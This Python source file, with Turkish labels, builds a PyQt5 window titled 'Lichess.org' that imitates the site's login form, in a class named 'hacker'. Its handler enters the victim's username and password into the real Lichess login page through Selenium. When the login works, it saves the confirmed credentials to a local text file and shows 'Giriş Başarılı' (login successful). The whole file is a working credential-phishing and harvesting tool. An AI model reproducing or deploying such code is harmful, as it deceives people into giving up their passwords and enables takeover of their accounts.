import time
from PyQt5.QtWidgets import *
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By


class hacker(QWidget):
    def __init__(self):
        super().__init__()

        self.init_ui()

    def init_ui(self):
        self.isimy = QLabel("isminizi girin")
        self.isimip = QLineEdit()
        self.sifrey = QLabel("sifre nizi girin")
        self.sifreip = QLineEdit()
        self.sifreip.setEchoMode(QLineEdit.Password)
        self.okay = QPushButton("Girişyap")
        self.sonuc = QLabel("")


        v_b = QVBoxLayout()

        v_b.addWidget(self.isimy)
        v_b.addWidget(self.isimip)
        v_b.addWidget(self.sifrey)
        v_b.addWidget(self.sifreip)
        v_b.addWidget(self.okay)
        v_b.addWidget(self.sonuc)

        h_b = QHBoxLayout()

        h_b.addLayout(v_b)

        self.setLayout(h_b)

        self.setWindowTitle("Lichess.org")


        self.okay.clicked.connect(self.hackle)


        self.show()


    def hackle(self):
        isim = self.isimip.text()
        sifre = self.sifreip.text()

        url = "https://lichess.org/login?referrer=/"

        browser = webdriver.Edge()

        browser.get(url)

        isimler = browser.find_element(By.XPATH,'//*[@id="form3-username"]')
        isimler.send_keys(isim)
        sifreler = browser.find_element(By.XPATH,'//*[@id="form3-password"]')
        sifreler.send_keys(sifre)

        gir = browser.find_element(By.XPATH,'//*[@id="main-wrap"]/main/form/div[1]/button')

        gir.click()
        time.sleep(3)
        
        try:
            deneme = browser.find_element(By.XPATH,'//*[@id="form3-password"]')
            deneme.send_keys("hhhhahaahahah")
            self.sonuc.setText("sifre yanlıs")
        except:
            dosya = open("dosya.txt","a+")
            dosya.write(isim)
            dosya.write("\n")
            dosya.write(sifre)
            dosya.write("\n")
            self.sonuc.setText("Giriş Başarılı")
            
       

        
        
        
            
            








uyg = QApplication(sys.argv)

pen = hacker()

sys.exit(uyg.exec_())